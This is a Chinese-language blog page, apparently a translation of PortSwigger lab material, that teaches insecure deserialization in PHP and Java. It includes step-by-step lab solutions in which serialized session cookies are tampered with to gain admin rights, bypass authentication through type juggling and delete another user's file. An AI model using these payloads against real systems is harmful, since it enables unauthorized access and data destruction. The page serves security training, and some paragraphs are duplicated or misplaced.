<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/006.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/6.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noto Sans SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><script src="https://kit.fontawesome.com/b1f8a1a551.js" crossorigin="anonymous"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css"><script src="/lib/pace/pace.min.js"></script><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"www.mcorazon.top",root:"/",scheme:"Gemini",version:"7.8.0",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!0,style:"default"},back2top:{enable:!0,sidebar:!0,scrollpercent:!0},bookmark:{enable:!1,color:"#00f",save:"manual"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"buttons",active:"gitalk",storage:!0,lazyload:!1,nav:null,activeClass:"gitalk"},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><link rel="stylesheet" href="/css/head.css"><meta name="description" content="这世界总有黑夜可我们总发着光"><meta property="og:type" content="website"><meta property="og:title" content="MCorazon"><meta property="og:url" content="https://www.mcorazon.top/page/3/index.html"><meta property="og:site_name" content="MCorazon"><meta property="og:description" content="这世界总有黑夜可我们总发着光"><meta property="og:locale" content="zh_CN"><meta property="article:author" content="Corazon"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://www.mcorazon.top/page/3/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!0,isPost:!1,lang:"zh-CN"}</script><title>MCorazon</title><script type="text/javascript" src="/js/tag/bubble.js"></script><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css"></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">MCorazon</h1><span class="logo-line-after"><i></i></span></a><p class="site-subtitle" itemprop="description"><font color="#ffffff" font-size="8em">强者,绝非偶然</font></p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li><li class="menu-item menu-item-commonweal"><a href="/commonweal/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><div class="reading-progress-bar"></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content index posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.mcorazon.top/posts/bea7d250/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/006.png"><meta itemprop="name" content="Corazon"><meta itemprop="description" content="<font color="#000000">这世界总有黑夜<br>可我们总发着光</font>"> </span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="MCorazon"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/posts/bea7d250/" class="post-title-link" itemprop="url">【PortSwigger靶场】反序列化</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2025-05-24 19:51:24" itemprop="dateCreated datePublished" datetime="2025-05-24T19:51:24+08:00">2025-05-24</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2025-07-22 12:24:25" itemprop="dateModified" datetime="2025-07-22T12:24:25+08:00">2025-07-22</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">靶场练习</span></a> </span>， <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/PortSwigger%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">PortSwigger靶场</span></a></span></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>12k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>11 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="不安全的反序列化">不安全的反序列化</h2><p>在本节中，我们将介绍什么是不安全的反序列化，并描述不安全的反序列化如何可能使网站遭受严重攻击。我们将重点介绍典型场景，并使用 PHP、Ruby 和 Java 反序列化的具体示例演示一些广泛适用的技术。我们还将介绍一些可以避免自己的网站出现不安全反序列化漏洞的方法。</p><h2 id="什么是序列化？">什么是序列化？</h2><p>序列化是将复杂的数据结构（如对象及其字段）转换为 “flatter” 格式的过程，这种格式可以作为连续的字节流发送和接收。数据序列化使以下工作变得更加简单：</p><ul class="lvl-0"><li class="lvl-2"><p>将复杂数据写入进程间内存、文件或数据库</p></li><li class="lvl-2"><p>通过网络、应用程序不同组件之间或 API 调用等方式发送复杂数据</p></li></ul><p>最重要的是，在序列化对象时，其状态也会被持久化。换句话说，对象的属性及其赋值都会被保留下来。</p><h3 id="序列化与反序列化">序列化与反序列化</h3><p>反序列化是将字节流还原为原始对象的全功能复制品的过程，其状态与序列化时完全相同。然后，网站的逻辑就可以与这个反序列化对象交互，就像与其他对象交互一样。</p><p>许多编程语言都为序列化提供本地支持。具体如何序列化对象取决于语言。有些语言将对象序列化为二进制格式，而其他语言则使用不同的字符串格式，其可读性也各不相同。请注意，原始对象的所有属性都会存储在序列化数据流中，包括任何私有字段。要防止某个字段被序列化，必须在类声明中将其明确标记为 “transient” 字段。</p><p>请注意，在使用不同的编程语言时，序列化可能被称为 marshalling（Ruby）或 pickling（Python）。这些术语在此处与 “serialization” 同义。</p><h2 id="什么是不安全的反序列化？">什么是不安全的反序列化？</h2><p>不安全的反序列化是指网站对用户可控数据进行反序列化。这有可能使攻击者操纵序列化对象，从而将有害数据传递到应用程序代码中。</p><p>甚至有可能将序列化后的对象替换为完全不同类的对象。令人担忧的是，网站可用的任何类的对象都会被反序列化和实例化，而不管预期的是哪个类。因此，不安全的反序列化有时被称为 “对象注入 ”漏洞。</p><p>一个意外类的对象可能会导致异常。不过，此时破坏可能已经造成。许多基于反序列化的攻击都是在反序列化完成之前完成的。这意味着，即使网站本身的功能不直接与恶意对象交互，反序列化过程本身也可能发起攻击。因此，逻辑基于强类型语言的网站也容易受到这些技术的攻击。</p><h2 id="不安全的反序列化漏洞是如何产生的？">不安全的反序列化漏洞是如何产生的？</h2><p>不安全的反序列化通常是因为人们普遍缺乏对反序列化用户可控数据的危险性的认识。理想情况下，用户输入根本不应该被反序列化。</p><p>不过，有时网站所有者会认为自己很安全，因为他们对反序列化数据实施了某种形式的额外检查。这种方法往往是无效的，因为几乎不可能实施验证或消毒来应对每一种可能发生的情况。这些检查从根本上说也是有缺陷的，因为它们依赖于在数据被反序列化后对其进行检查，而在许多情况下，这已经太晚了，无法阻止攻击。</p><p>由于通常认为反序列化对象是可信的，因此也可能出现漏洞。特别是在使用二进制序列化格式的语言时，开发人员可能会认为用户无法有效地读取或操作数据。然而，虽然可能需要付出更多努力，但攻击者利用二进制序列化对象的可能性与利用基于字符串格式的对象的可能性一样大。</p><p>现代网站中存在大量依赖关系，这也使得基于反序列化的攻击成为可能。一个典型的网站可能实现了许多不同的库，每个库都有自己的依赖关系。这就形成了一个庞大的类和方法池，很难对其进行安全管理。由于攻击者可以创建任何这些类的实例，因此很难预测在恶意数据上可以调用哪些方法。如果攻击者能够将一长串意想不到的方法调用串联起来，将数据传递到与初始源完全无关的汇中，情况就更是如此。因此，要预测恶意数据流并堵住每个潜在漏洞几乎是不可能的。</p><p>简而言之，可以说不可能安全地反序列化不受信任的输入。</p><h2 id="不安全的反序列化会产生什么影响？">不安全的反序列化会产生什么影响？</h2><p>不安全的反序列化可能会造成非常严重的影响，因为它为大量增加的攻击面提供了一个切入点。它允许攻击者以有害的方式重复使用现有的应用程序代码，导致许多其他漏洞，通常是远程代码执行。</p><p>即使在不可能执行远程代码的情况下，不安全的反序列化也会导致权限升级、任意文件访问和拒绝服务攻击。</p><h2 id="如何利用不安全的反序列化漏洞">如何利用不安全的反序列化漏洞</h2><p>现在您已经熟悉了序列化和反序列化的基础知识，我们可以看看如何利用不安全的反序列化漏洞。</p><h2 id="利用不安全的反序列化漏洞">利用不安全的反序列化漏洞</h2><p>在本节中，我们将以 PHP、Ruby 和 Java 反序列化为例，教您如何利用一些常见情况。我们希望展示利用不安全的反序列化实际上比许多人想象的要容易得多。如果您能够使用预构建的小工具链，甚至在黑盒测试中可以做到这一点。</p><p>我们还将指导您创建自己的基于反序列化的高严重性攻击。虽然这些攻击通常需要源代码访问权限，但一旦理解了基本概念，学习起来也会比想象中容易。我们将特别介绍以下主题：</p><ul class="lvl-0"><li class="lvl-2"><p>如何识别不安全的反序列化 LABS</p></li><li class="lvl-2"><p>修改网站期望的序列化对象 LABS</p></li><li class="lvl-2"><p>向危险的网站功能传递恶意数据 LABS</p></li><li class="lvl-2"><p>注入任意对象类型</p></li><li class="lvl-2"><p>串联方法调用以控制进入危险水槽小工具的数据流 LABS</p></li><li class="lvl-2"><p>手动创建自己的高级漏洞利用程序 LABS</p></li><li class="lvl-2"><p>PHAR 反序列化</p></li></ul><blockquote><p><strong>Note</strong></p><p>尽管许多实验和示例都基于 PHP，但大多数开发技术对其他语言也同样适用。</p></blockquote><h3 id="如何识别不安全的反序列化">如何识别不安全的反序列化</h3><p>不管是白盒测试还是黑盒测试，识别不安全的反序列化都相对简单。</p><p>在审计过程中，你应该查看所有传入网站的数据，并尝试识别任何看起来像序列化数据的东西。如果了解不同语言使用的格式，序列化数据就能比较容易地识别出来。在本节中，我们将展示 PHP 和 Java 序列化的示例。一旦识别出序列化数据，就可以测试是否能够控制它。</p><blockquote><p><strong>Tip</strong></p><p>对于 Burp Suite Professional 的用户，Burp Scanner 会自动标记任何看起来包含序列化对象的 HTTP 消息。</p></blockquote><h3 id="PHP-序列化格式">PHP 序列化格式</h3><p>PHP 使用的大多是人类可读的字符串格式，字母代表数据类型，数字代表每个条目的长度。例如，用户对象的属性为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;name = <span class="string">&quot;carlos&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;isLoggedIn = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>序列化后，该对象的外观可能如下所示：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>:s:<span class="number">6</span>:<span class="string">&quot;carlos&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;isLoggedIn&quot;</span>:b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>这可以解释为：</p><ul class="lvl-0"><li class="lvl-2"><p><code>O:4: &quot;User&quot;</code> - 具有 4 个字符类名 <code>&quot;User&quot;</code> 的对象</p></li><li class="lvl-2"><p><code>2</code> - 该对象有 2 个属性</p></li><li class="lvl-2"><p><code>s:4: &quot;name&quot;</code> - 第一个属性的键是 4 个字符的字符串 <code>“name”</code>。</p></li><li class="lvl-2"><p><code>s:6: &quot;carlos&quot;</code> - 第一个属性的值是 6 个字符的字符串 <code>“carlos”</code>。</p></li><li class="lvl-2"><p><code>s:10: &quot;isLoggedIn&quot;</code> - 第二个属性的键是 10 个字符的字符串 “isLoggedIn”。</p></li><li class="lvl-2"><p><code>b:1</code> - 第二个属性的值是布尔值 <code>true</code></p></li></ul><p>PHP 序列化的本地方法是 <code>serialize()</code>和 <code>unserialize()</code>。如果可以访问源代码，就应该先在代码中查找 <code>unserialize()</code>，然后进一步研究。</p><h3 id="Java-序列化格式">Java 序列化格式</h3><p>有些语言（如 Java）使用二进制序列化格式。这种格式更难读取，但如果知道如何识别一些蛛丝马迹，还是可以识别序列化数据的。例如，序列化的 Java 对象总是以相同的字节开始，在十六进制中编码为 <code>aced</code>，在 Base64 中编码为 <code>rO0</code>。</p><p>任何实现了 <code>java.io.Serializable</code> 接口的类都可以被序列化和反序列化。如果您可以访问源代码，请注意任何使用 <code>readObject()</code> 方法的代码，该方法用于从 <code>InputStream</code> 中读取和反序列化数据。</p><h3 id="操作序列化对象">操作序列化对象</h3><p>利用某些反序列化漏洞就像更改序列化对象中的一个属性一样简单。由于对象状态是持久化的，因此可以通过研究序列化数据来识别和编辑有趣的属性值。然后，您就可以通过网站的反序列化过程将恶意对象传入网站。这是基本反序列化漏洞利用的第一步。</p><p>一般来说，在操作序列化对象时有两种方法。一种是直接编辑字节流形式的对象，另一种是用相应的语言编写简短的脚本，自己创建新对象并将其序列化。在处理二进制序列化格式时，后一种方法通常更为简便。</p><h4 id="修改对象属性">修改对象属性</h4><p>在篡改数据时，只要攻击者保留了一个有效的序列化对象，反序列化过程就会创建一个带有修改后属性值的服务器端对象。</p><p>举个简单的例子，一个网站使用序列化的 <code>User</code> 对象在 cookie 中存储用户会话数据。如果攻击者在 HTTP 请求中发现了这个序列化对象，他们可能会对其进行解码，发现以下字节流：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;carlos&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isAdmin&quot;</span>;b:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><p><code>isAdmin</code> 属性是一个明显的关注点。攻击者只需将该属性的布尔值改为 <code>1</code>（true），重新编码对象，然后用修改后的值覆盖当前 cookie 即可。单独来看，这不会产生任何影响。但是，假设网站使用此 cookie 来检查当前用户是否有访问某些管理功能的权限：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>-&gt;isAdmin === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// allow access to admin interface</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段有漏洞的代码会根据 cookie 中的数据（包括攻击者修改过的 <code>isAdmin</code> 属性）实例化一个<code>User</code>对象。在任何时候都不会检查序列化对象的真实性。然后，这些数据会被传递到条件语句中，在这种情况下，就可以轻松实现权限升级。</p><p>这种简单的情况在实际应用中并不常见。不过，以这种方式编辑属性值，展示了获取不安全反序列化所暴露的大量攻击面的第一步。</p><h4 id="Lab：修改序列化对象">Lab：修改序列化对象</h4><p>本实验使用了基于序列化的会话机制，因此存在权限升级漏洞。要解决该实验问题，请编辑会话 cookie 中的序列化对象，利用此漏洞获得管理权限。然后删除用户 carlos。</p><ul class="lvl-0"><li class="lvl-2"><p>使用自己的凭据登录。请注意，登录后的 <code>GET /my-account</code> 请求包含一个会话 cookie，它似乎是 URL 和 Base64 编码的。</p></li><li class="lvl-2"><p>使用 Burp 的 Inspector 面板研究请求的解码形式。请注意，cookie 实际上是一个序列化的 PHP 对象。admin 属性包含 b:0，表示布尔值 false。将此请求发送到 Burp Repeater。</p></li><li class="lvl-2"><p>在 Burp Repeater 中，使用检查器再次检查 cookie，并将 admin 属性的值更改为 b:1。点击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p></li><li class="lvl-2"><p>发送请求。请注意，响应中现在包含了一个指向 /admin 管理面板的链接，表明您已使用管理员权限访问了该页面。</p></li><li class="lvl-2"><p>将请求路径改为 /admin，然后重新发送。注意 /admin 页面包含删除特定用户账户的链接。</p></li><li class="lvl-2"><p>将请求路径更改为 /admin/delete?username=carlos，然后发送请求以解决实验室问题。</p></li></ul><h4 id="修改数据类型">修改数据类型</h4><p>我们已经看到了如何修改序列化对象中的属性值，但也有可能提供意想不到的数据类型。</p><p>由于在比较不同数据类型时使用了松散比较运算符 (==)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 5 == “5” 的值为 true。</p><h2 id="如何防止不安全的反序列化漏洞">如何防止不安全的反序列化漏洞</h2><p>一般来说，除非绝对必要，否则应避免对用户输入进行反序列化。在许多情况下，反序列化可能带来的高严重性漏洞，以及防范这些漏洞的难度，都超过了反序列化的好处。</p><p>由于在比较不同数据类型时使用了松散比较运算符 (==)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 5 == “5” 的值为 true。</p><p>由于在比较不同数据类型时使用了松散比较运算符 (<code>==</code>)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 <code>5 == “5”</code> 的值为 <code>true</code>。</p><p>不同寻常的是，这也适用于任何以数字开头的字母数字字符串。在这种情况下，PHP 将根据开头的数字有效地将整个字符串转换为整数值。字符串的其余部分将被完全忽略。因此，<code>5 == &quot;5 of something&quot;</code> 实际上被视为 <code>5 == 5</code>。</p><p>同样，在 PHP 7.x 及更早版本中，比较 <code>0 == &quot;Example string&quot;</code> 的结果为 <code>true</code>，因为 PHP 将整个字符串视为整数 <code>0</code>。</p><p>考虑将这种松散的比较运算符与来自反序列化对象的用户可控数据结合使用的情况。这有可能导致危险的逻辑缺陷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$login</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line"><span class="comment">// log in successfully</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设攻击者修改了密码属性，使其包含整数 <code>0</code>，而不是预期的字符串。只要存储的密码不是以数字开头，该条件就会始终返回 <code>true</code>，从而实现身份验证绕过。请注意，这只是因为反序列化保留了数据类型。如果代码直接从请求中获取密码，<code>0</code> 将被转换为字符串，条件将返回 <code>false</code>。</p><blockquote><p><strong>Note</strong></p><p>在 PHP 8 及以后的版本中，0 == “Example string ”比较结果为 false，因为在比较过程中字符串不再隐式转换为 0。因此，在这些版本的 PHP 中无法使用此漏洞。</p><p>比较以数字开头的字母数字字符串的行为在 PHP 8 中保持不变。因此，5 == <code>“5 of something ”</code>仍被视为 <code>5 == 5</code>。</p></blockquote><p>请注意，在修改任何序列化对象格式中的数据类型时，一定要记得更新序列化数据中的任何类型标签和长度指示符。否则，序列化对象将被损坏，无法进行反序列化。</p><h4 id="Lab：-修改序列化数据类型">Lab： 修改序列化数据类型</h4><p>本实验使用了基于序列化的会话机制，因此容易发生身份验证绕过。要解决该实验问题，请编辑会话 cookie 中的序列化对象，以访问<code>administrator</code>账户。然后删除用户 <code>carlos</code>。</p><ul class="lvl-0"><li class="lvl-2"><p>使用自己的凭据登录。在 Burp 中，打开登录后的 <code>GET /my-account</code> 请求，并使用检查器检查会话 cookie，以显示序列化的 PHP 对象。将此请求发送到 Burp Repeater。</p></li><li class="lvl-2"><p>在 Burp Repeater 中，使用检查器面板对会话 cookie 进行如下修改：</p><ul class="lvl-2"><li class="lvl-4"><p>将用户名属性的长度更新为 13。</p></li><li class="lvl-4"><p>将用户名改为管理员。</p></li><li class="lvl-4"><p>将访问令牌更改为整数 0。 由于这不再是字符串，因此还需要删除值周围的双引号。</p></li><li class="lvl-4"><p>将 s 替换为 i，更新访问令牌的数据类型标签。</p></li></ul></li></ul><p>结果应该是这样的:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;administrator&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;access_token&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p>单击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p></li><li class="lvl-2"><p>发送请求。请注意，响应中现在包含一个指向 <code>/admin</code> 管理面板的链接，表明您已成功以管理员用户身份访问该页面。</p></li><li class="lvl-2"><p>将请求路径改为 <code>/admin</code>，然后重新发送。注意<code>/admin</code> 页面包含删除特定用户账户的链接。</p></li><li class="lvl-2"><p>将请求路径更改为<code>/admin/delete?username=carlos</code>，然后发送请求以解决实验室问题。</p></li></ul><p>在直接处理二进制格式时，我们建议使用 BApp 商店提供的 Hackvertor 扩展。使用 Hackvertor，你可以将序列化数据修改为字符串，它会自动更新二进制数据，并相应调整偏移量。这样可以节省大量的手动操作。</p><h2 id="使用应用程序功能">使用应用程序功能</h2><p>除了简单地检查属性值外，网站功能还可能对来自反序列化对象的数据执行危险操作。在这种情况下，您可以利用不安全的反序列化传递非预期数据，并利用相关功能进行破坏。</p><p>例如，作为网站 “删除用户 ”功能的一部分，用户的个人资料图片是通过访问 <code>$user-&gt;image_location</code> 属性中的文件路径来删除的。如果该 <code>$user</code> 是通过序列化对象创建的，攻击者就可以通过将 <code>image_location</code> 设置为任意文件路径的修改后传入来利用这一漏洞。删除自己的用户账户后，也会删除这个任意文件。</p><h4 id="Lab：-使用应用程序功能利用不安全的反序列化">Lab： 使用应用程序功能利用不安全的反序列化</h4><p>本实验室使用基于序列化的会话机制。某个功能会对序列化对象中提供的数据调用一个危险的方法。要解决这个实验问题，请编辑会话 cookie 中的序列化对象，并用它删除<code>Carlos</code>主目录中的 <code>morale.txt</code> 文件。</p><ol><li class="lvl-3"><p>登录自己的账户。在 “我的账户 ”页面，注意到有删除账户的选项，可向 /my-account/delete 发送 POST 请求。</p></li><li class="lvl-3"><p>向 Burp Repeater 发送包含会话 cookie 的请求。</p></li><li class="lvl-3"><p>在 Burp Repeater 中，使用检查器面板研究会话 cookie。注意到序列化对象有一个 avatar_link 属性，其中包含头像的文件路径。</p></li><li class="lvl-3"><p>编辑序列化数据，使 avatar_link 指向 /home/carlos/morale.txt。记住要更新长度指示符。修改后的属性应如下所示：</p></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">s</span>:<span class="number">11</span>:<span class="string">&quot;avatar_link&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;/home/carlos/morale.txt&quot;</span></span><br></pre></td></tr></table></figure><ol start="5"><li class="lvl-3"><p>点击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p></li><li class="lvl-3"><p>将请求行改为 POST /my-account/delete 并发送请求。您的账户将被删除，同时删除的还有卡洛斯的 morale.txt 文件。</p></li></ol><p>这个示例依赖于攻击者通过用户可访问的功能手动调用危险方法。但是，如果利用漏洞自动将数据传递到危险方法中，不安全的反序列化就会变得更加有趣。使用 “magic methods ”可以实现这一点。</p><h2 id="Magic-methods">Magic methods</h2><p>魔法方法是无需显式调用的方法的特殊子集。相反，每当发生特定事件或情况时，它们就会被自动调用。魔法方法是各种语言中面向对象编程的常见特征。有时会在方法名称的前缀或周围加上双引号来表示它们。</p><p>开发人员可以在类中添加魔法方法，以便预先确定在相应事件或场景发生时应执行哪些代码。调用魔法方法的具体时间和原因因方法而异。PHP 中最常见的例子之一是 <code>__construct()</code>，它在类的对象实例化时被调用，类似于 Python 的 <code>__init__</code> 。通常，构造函数魔法方法包含初始化实例属性的代码。不过，开发人员可以自定义魔法方法，以执行他们想要的任何代码。</p><p>魔法方法被广泛使用，其本身并不代表漏洞。但是，当执行这些方法的代码处理攻击者可控制的数据（例如来自反序列化对象的数据）时，它们就会变得危险。攻击者可以利用这一点，在满足相应条件时自动调用反序列化数据上的方法。</p><p>最重要的是，有些语言在反序列化过程中会自动调用魔法方法。例如，PHP 的 <code>unserialize()</code> 方法会查找并调用对象的 <code>__wakeup()</code> 魔法方法。</p><p>在 Java 反序列化中，<code>ObjectInputStream.readObject()</code> 方法也是如此，该方法用于从初始字节流中读取数据，本质上类似于 “重新初始化 ”序列化对象的构造函数。不过，可序列化类也可以按如下方式声明自己的 <code>readObject()</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// implementation</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以这种方式声明的 <code>readObject()</code> 方法就像一个魔法方法，在反序列化过程中会被调用。这样，类就能更紧密地控制自己字段的反序列化。</p><p>你应该密切关注任何包含这类神奇方法的类。它们允许你在对象完全反序列化之前将数据从序列化对象传递到网站代码中。这是创建更高级漏洞的起点。</p><h2 